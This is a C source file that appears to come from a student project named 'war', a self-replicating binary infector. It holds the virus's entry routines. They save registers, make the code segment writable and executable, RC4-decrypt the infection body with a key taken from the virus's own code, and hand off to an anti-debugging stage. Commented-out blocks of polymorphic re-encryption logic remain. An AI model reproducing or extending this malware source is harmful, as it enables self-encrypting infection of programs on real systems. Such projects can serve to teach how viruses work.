/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*  start.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 19:16:30 by ddinaut           #+#    #+#             */
/*   Updated: 2019/04/11 11:29:42 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

/*
   main() transform our master (number 0 infection) into an *almost* infected binary
   to match our flip-flop infection routine.
*/
int		main(void)
{
	__asm__ __volatile__ (
		"push	rbp;"
		"push	0x0;"
		"push	rbx;"
		"push	rax;"
		"push	rdi;"
		"push	rsi;"
		"push	rdx;"
		"push	rcx;"
		"push	r8;"
		"push	r9;"
		"push	r10;"
		"push	r11;"
		"push	r12;"
		"push	r13;"
		"push	r14;"
		"push	r15;"
		);

	t_data	data = {0};
	__asm__ __volatile__ (
		"mov	%0, rsp;"
		: "=r"(data.rsp)
		);


	void	*sstart = main;
	size_t	align = (unsigned long)sstart % 0x1000;

	// set write permission -> ugly way
	if (mprotect(sstart - align, ((void*)end_of_data - (void*)main) + 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC) < 0)
	{
		perror("mprotect");
		return (-1);
	}

	/* end -> can't encrypt this one. it's create a black magic segfault from nowhere in infected start().
	   Still unsure about the reason. */

	/* update_two(&data.key, (char*)release, (size_t)end - (size_t)release); */
	/* revert_two(&data.key, (char*)end, (size_t)update_one - (size_t)end); */
	/* printf("%-10s: addr: [%p] size: %ld\tkey: 0x%lx\n", "end", end, (size_t)update_one - (size_t)end, data.key.two); */


/* 	// release */
/* 	update_one(&data.key, (char*)patch, (size_t)release - (size_t)patch); */
/* 	revert_one(&data.key, (char*)release, (size_t)end - (size_t)release); */
/* #ifdef DEBUG */
/* 	printf("%-10s: addr: [%p] size: %ld\tkey: 0x%lx\n", "release", release, (size_t)end - (size_t)release, data.key.one); */
/* #endif */


/* 	//	patch */
/* 	update_two(&data.key, (char*)inject, (size_t)patch - (size_t)inject); */
/* 	revert_two(&data.key, (char*)patch, (size_t)release - (size_t)patch); */
/* #ifdef DEBUG */
/* 	printf("%-10s: addr: [%p] size: %ld\tkey: 0x%lx\n", "patch", patch, (size_t)release - (size_t)patch, data.key.two); */
/* #endif */


/* 	// inject */
/* 	update_one(&data.key, (char*)infect, (size_t)inject - (size_t)infect); */
/* 	revert_one(&data.key, (char*)inject, (size_t)patch - (size_t)inject); */
/* #ifdef DEBUG */
/* 	printf("%-10s: addr: [%p] size: %ld\tkey: 0x%lx\n", "inject", inject, (size_t)patch - (size_t)inject, data.key.one); */
/* #endif */


/* 	// infect */
/* 	update_two(&data.key, (char*)inspect, (size_t)infect - (size_t)inspect); */
/* 	revert_two(&data.key, (char*)infect, (size_t)inject - (size_t)infect); */
/* #ifdef DEBUG */
/* 	printf("%-10s: addr: [%p] size: %ld\tkey: 0x%lx\n", "infect", infect, (size_t)inject - (size_t)infect, data.key.two); */
/* #endif */


/* 	// inspect */
/* 	update_one(&data.key, (char*)locate, (size_t)inspect - (size_t)locate); */
/* 	revert_one(&data.key, (char*)inspect, (size_t)infect - (size_t)inspect); */
/* #ifdef DEBUG */
/* 	printf("%-10s: addr: [%p] size: %ld\tkey: 0x%lx\n", "inspect", inspect, (size_t)infect - (size_t)inspect, data.key.one); */
/* #endif */


/* 	// locate */
/* 	update_two(&data.key, (char*)war, (size_t)locate - (size_t)war); */
/* 	revert_two(&data.key, (char*)locate, (size_t)inspect - (size_t)locate); */
/* #ifdef DEBUG */
/* 	printf("%-10s: addr: [%p] size: %ld\tkey: 0x%lx\n", "locate", locate, (size_t)inspect - (size_t)locate, data.key.two); */
/* #endif */


/* 	// war */
/* 	update_one(&data.key, (char*)opening, (size_t)war - (size_t)opening); */
/* 	revert_one(&data.key, (char*)war, (size_t)locate - (size_t)war); */
/* #ifdef DEBUG */
/* 	printf("%-10s: addr: [%p] size: %ld\tkey: 0x%lx\n", "war", war, (size_t)locate - (size_t)war, data.key.one); */
/* #endif */

/* 	// opening */
/* 	update_two(&data.key, (char*)antidebug, (size_t)opening - (size_t)antidebug); */
/* 	revert_two(&data.key, (char*)opening, (size_t)war - (size_t)opening); */
/* #ifdef DEBUG */
/* 	printf("%-10s: addr: [%p] size: %ld\tkey: 0x%lx\n", "opening", opening, (size_t)war - (size_t)opening, data.key.two); */
/* #endif */

/* 	// (not necessary) antidebug */
/* 	update_one(&data.key, (char*)start, (size_t)antidebug - (size_t)start); */
/* 	revert_one(&data.key, (char*)antidebug, (size_t)opening - (size_t)antidebug); */

/* 	update_one(&data.key, (char*)start, (size_t)antidebug - (size_t)start); */
/* 	revert_one(&data.key, (char*)antidebug, (size_t)opening - (size_t)antidebug); */

/* #ifdef DEBUG */
/* 	printf("%-10s: addr: [%p] size: %ld\tkey: 0x%lx\n", "antidebug", antidebug, (size_t)opening - (size_t)antidebug, data.key.one); */
/* #endif */


	data.context = true;
	antidebug(&data);
}

/*
   Infected entrypoint. Backup all register to restart stack as if nothing happened (using rsp),
   then decrypt whole infection from opening() to end().
*/
void	start(void)
{

	__asm__ __volatile__ (
		"push	rbp;"
		"push	0x0;"
		"push	rbx;"
		"push	rax;"
		"push	rdi;"
		"push	rsi;"
		"push	rdx;"
		"push	rcx;"
		"push	r8;"
		"push	r9;"
		"push	r10;"
		"push	r11;"
		"push	r12;"
		"push	r13;"
		"push	r14;"
		"push	r15;"
		);

	t_data	data = {0};
	__asm__ __volatile__ (
		"mov	%0, rsp;"
		: "=r"(data.rsp)
		);

	uint8_t *r4 = (uint8_t*)_rc4;
   	for (register int i = 0  ; i < KEY_SIZE ; i++)
		data.cpr_key[i] = r4[i];
	_rc4((uint8_t*)data.cpr_key, KEY_SIZE, (uint8_t*)antidebug, ((size_t)_rc4 - (size_t)antidebug));

#ifdef DEBUG
	char trace[] = "start\n";
	_log(trace, _strlen(trace));
#endif

	data.context = true;
	/* update_one(&data.key, (char*)start, (size_t)antidebug - (size_t)start); */
	/* revert_one(&data.key, (char*)antidebug, (size_t)opening - (size_t)antidebug); */
	antidebug(&data);
}
